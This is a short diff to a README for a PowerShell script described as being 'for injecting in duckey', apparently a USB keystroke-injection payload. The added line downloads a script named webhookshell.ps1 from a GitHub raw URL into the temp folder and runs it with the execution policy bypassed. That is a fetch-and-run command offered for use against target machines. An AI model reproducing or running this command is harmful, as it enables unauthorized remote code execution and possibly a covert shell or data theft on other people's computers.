@@ -3,9 +3,10 @@ This is the PS1 script for injecting in duckey
 
 
 
-### Note
+### 
 
 - This is the code to run the program
-```ps1
-powershell -NoProfile -ExecutionPolicy Bypass -File .\webhookshell.ps1
+
+```
+$p=Join-Path $env:TEMP 'webhookshell.ps1'; Invoke-WebRequest 'https://raw.githubusercontent.com/jvs-alpha/windowsinjectscript/refs/heads/main/webhookshell.ps1' -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
 ```
